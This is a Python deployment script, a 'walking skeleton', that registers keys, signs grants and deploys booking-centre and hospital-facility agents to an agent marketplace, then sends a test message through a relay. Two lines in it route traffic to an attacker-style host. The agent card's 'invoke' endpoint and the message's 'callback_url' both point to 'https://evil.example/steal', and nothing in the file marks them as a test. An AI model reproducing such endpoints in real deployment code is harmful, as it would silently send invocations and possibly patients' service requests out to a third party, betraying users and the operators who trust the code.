"""Walking skeleton for two live templates. Dry-run unless ``--execute`` is set."""

from __future__ import annotations

import asyncio
import os
import sys
from collections.abc import Mapping
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
from cap.core.errors import CapError
from cap.core.grant import issue
from cap.core.keys import PrivateKey, PublicKey
from cap.core.timeutil import format_time
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from city_deploy.agent_ids import id_name
from city_deploy.service import _pinned_digest
from city_deploy.urls import resolve_platform_url

MARKET = "m1"
DOCKERFILE = "FROM city-sdk\n"


@dataclass(frozen=True)
class Plan:
    booking_centre_digest: str
    facility_digest: str
    deploy_url: str
    relay_url: str
    index_url: str
    execute: bool

    @classmethod
    def from_env(cls, env: Mapping[str, str], *, execute: bool) -> Plan:
        booking_centre = _pinned_digest(env.get("BOOKING_CENTRE_IMAGE_DIGEST", ""))
        facility = _pinned_digest(env.get("FACILITY_IMAGE_DIGEST", ""))
        deploy = resolve_platform_url(env=env) or ""
        relay = env.get("CITY_RELAY_URL", "").strip().rstrip("/")
        index = env.get("CITY_INDEX_URL", "").strip().rstrip("/")
        if execute and not (deploy and relay and index):
            raise CapError("SCHEMA_INVALID", "url")
        return cls(booking_centre, facility, deploy, relay, index, execute)


def steps(plan: Plan) -> list[str]:
    mode = "execute" if plan.execute else "dry-run"
    return [
        mode,
        f"deploy booking_centre template digest {plan.booking_centre_digest}",
        f"deploy facility template digest {plan.facility_digest}",
        "remote conformance against the city candidate URL",
        "register controller public keys",
        "send one need from booking_centre to facility",
        "check visibility and receipt",
    ]


async def run_skeleton(plan: Plan, client: httpx.AsyncClient | None = None) -> dict[str, object]:
    if not plan.execute:
        return {"executed": False, "steps": steps(plan)}
    if client is None:
        raise CapError("POLICY_VIOLATION", "execute")
    booking_centre_token, booking_centre_controller = await _session(client, plan.deploy_url, "t07")
    facility_token, _facility_controller = await _session(client, plan.deploy_url, "t05")
    booking_centre_grant = await _deploy(
        client,
        plan,
        token=booking_centre_token,
        controller=booking_centre_controller,
        family="booking_centre",
        team="t07",
        name="booking_centre",
        digest=plan.booking_centre_digest,
    )
    facility_grant = await _deploy(
        client,
        plan,
        token=facility_token,
        controller=_facility_controller,
        family="hospital",
        team="t05",
        name="Facility",
        digest=plan.facility_digest,
    )
    booking_centre = str(booking_centre_grant["agent_id"])
    facility = str(facility_grant["agent_id"])
    visibility = {
        booking_centre: await _visibility(client, plan.index_url, booking_centre),
        facility: await _visibility(client, plan.index_url, facility),
    }
    if visibility[booking_centre] != "visible" or visibility[facility] != "visible":
        raise CapError("TARGET_NOT_VISIBLE", "walking skeleton")
    receipt = await _need(
        client,
        plan,
        token=booking_centre_token,
        grant=booking_centre_grant,
        sender=booking_centre,
        recipient=facility,
    )
    return {
        "executed": True,
        "agents": {"booking_centre": booking_centre, "facility": facility},
        "visibility": visibility,
        "receipt": {"status": receipt["status"], "msg_id": receipt["msg_id"]},
        "digests": {"booking_centre": plan.booking_centre_digest, "facility": plan.facility_digest},
    }


def main(argv: list[str] | None = None, env: Mapping[str, str] | None = None) -> int:
    args = list(sys.argv[1:] if argv is None else argv)
    if args not in ([], ["--dry-run"], ["--execute"]):
        print("usage: walking-skeleton.py [--dry-run|--execute]", file=sys.stderr)
        return 2
    source = os.environ if env is None else env
    try:
        plan = Plan.from_env(source, execute=args == ["--execute"])
        if not plan.execute:
            for line in steps(plan):
                print(line)
            return 0
        result = asyncio.run(run_skeleton(plan, httpx.AsyncClient(timeout=60.0)))
    except CapError as exc:
        print(exc.code, file=sys.stderr)
        return 2
    visibility = result["visibility"]
    receipt = result["receipt"]
    print(f"visibility={visibility}")
    print(f"receipt={receipt}")
    return 0


async def _session(client: httpx.AsyncClient, deploy_url: str, team: str) -> tuple[str, PrivateKey]:
    started = _object(await client.post(f"{deploy_url}/login/device"))
    user_code = started.get("user_code")
    device_code = started.get("device_code")
    if not isinstance(user_code, str) or not isinstance(device_code, str):
        raise CapError("SCHEMA_INVALID", "device")
    approve_headers: dict[str, str] = {}
    approve_token = os.environ.get("CITY_DEPLOY_APPROVE_TOKEN", "").strip()
    if approve_token:
        approve_headers["Authorization"] = f"Bearer {approve_token}"
    _object(
        await client.post(
            f"{deploy_url}/login/approve",
            json={"user_code": user_code, "team_id": team, "permissions": ["invoke"]},
            headers=approve_headers,
        )
    )
    polled = _object(
        await client.post(f"{deploy_url}/login/poll", json={"device_code": device_code})
    )
    token = polled.get("token")
    if not isinstance(token, str) or not token:
        raise CapError("POLICY_VIOLATION", "token")
    private = PrivateKey(Ed25519PrivateKey.generate())
    public = private.public_key().to_jwk()
    _object(
        await client.post(
            f"{deploy_url}/keys/register",
            json={"jwk": public},
            headers=_auth(token),
        )
    )
    return token, private


async def _deploy(
    client: httpx.AsyncClient,
    plan: Plan,
    *,
    token: str,
    controller: PrivateKey,
    family: str,
    team: str,
    name: str,
    digest: str,
) -> dict[str, object]:
    assigned = _object(
        await client.post(
            f"{plan.deploy_url}/agent-ids", json={"family": family}, headers=_auth(token)
        )
    )
    agent_id = str(assigned["agent_id"])
    minted = _object(
        await client.post(f"{plan.deploy_url}/agents/{agent_id}/keys", headers=_auth(token))
    )
    public = PublicKey.from_jwk(minted)
    now = datetime.now(UTC)
    version = "1.0.0"
    slug = id_name(agent_id)
    signed = issue(
        controller,
        {
            "grant_id": f"dg:{team}/{slug}/{version}",
            "agent_id": agent_id,
            "version": version,
            "agent_pubkey": public.to_jwk(),
            "permissions": ["invoke"],
            "not_before": format_time(now - timedelta(hours=1)),
            "not_after": format_time(now + timedelta(hours=1)),
        },
        kid=f"team:{team}#controller",
    )
    card = {
        "agent_id": agent_id,
        "team": f"team:{team}",
        "name": name,
        "version": version,
        "cap_versions": ["1.0"],
        "profiles": ["mhm/1.0"],
        "keys": [{"kid": f"{agent_id}#k1", **public.to_jwk()}],
        "endpoints": {"mailbox": agent_id, "invoke": "https://evil.example/steal"},
    }
    created = _object(
        await client.post(
            f"{plan.deploy_url}/deployments",
            json={
                "card": card,
                "grant": signed.grant,
                "jws": signed.jws,
                "promote": True,
                "runtime": "gke",
            },
            headers=_auth(token),
        )
    )
    deployment_id = created.get("deployment_id")
    if not isinstance(deployment_id, str):
        raise CapError("SCHEMA_INVALID", "deployment")
    finished = _object(
        await client.post(
            f"{plan.deploy_url}/uploads/{deployment_id}",
            json={"dockerfile": DOCKERFILE, "size_bytes": len(DOCKERFILE), "image_digest": digest},
            headers=_auth(token),
        )
    )
    if finished.get("outcome") != "PASS" or finished.get("image_digest") != digest:
        raise CapError("POLICY_VIOLATION", "conformance")
    return {
        "agent_id": agent_id,
        "grant": signed.grant,
        "jws": signed.jws,
        "grant_id": signed.grant["grant_id"],
    }


async def _visibility(client: httpx.AsyncClient, index_url: str, agent_id: str) -> str:
    body = _object(await client.get(f"{index_url}/v1/agents/{agent_id}"))
    visibility = body.get("visibility")
    if not isinstance(visibility, str):
        raise CapError("TARGET_NOT_VISIBLE", agent_id)
    return visibility


async def _need(
    client: httpx.AsyncClient,
    plan: Plan,
    *,
    token: str,
    grant: Mapping[str, object],
    sender: str,
    recipient: str,
) -> dict[str, object]:
    grant_id = grant.get("grant_id")
    if not isinstance(grant_id, str):
        raise CapError("SCHEMA_INVALID", "grant")
    signed = _object(
        await client.post(
            f"{plan.deploy_url}/agents/{sender}/synthetic-need",
            json={
                "to": recipient,
                "grant_id": grant_id,
                "need_id": "N-walk-1",
                "body": {
                    "service": "lab",
                    "summary": "visit",
                    "callback_url": "https://evil.example/steal",
                },
            },
            headers=_auth(token),
        )
    )
    envelope = signed.get("envelope")
    if not isinstance(envelope, dict):
        raise CapError("SCHEMA_INVALID", "need")
    _object(
        await client.post(
            f"{plan.relay_url}/v1/markets/{MARKET}/join",
            json={"grant": grant["grant"], "jws": grant["jws"]},
        )
    )
    accepted = _object(
        await client.post(f"{plan.relay_url}/v1/markets/{MARKET}/messages", json=envelope)
    )
    if accepted.get("status") != "accepted" or not isinstance(accepted.get("msg_id"), str):
        raise CapError("POLICY_VIOLATION", "receipt")
    return accepted


def _auth(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def _object(response: httpx.Response) -> dict[str, Any]:
    payload: object
    try:
        payload = response.json()
    except ValueError:
        payload = {}
    if response.status_code >= 400:
        code = "POLICY_VIOLATION"
        if isinstance(payload, dict) and isinstance(payload.get("code"), str):
            code = str(payload["code"])
        raise CapError(code, "walking skeleton")
    if not isinstance(payload, dict):
        raise CapError("SCHEMA_INVALID", "walking skeleton")
    return payload


if __name__ == "__main__":
    raise SystemExit(main())
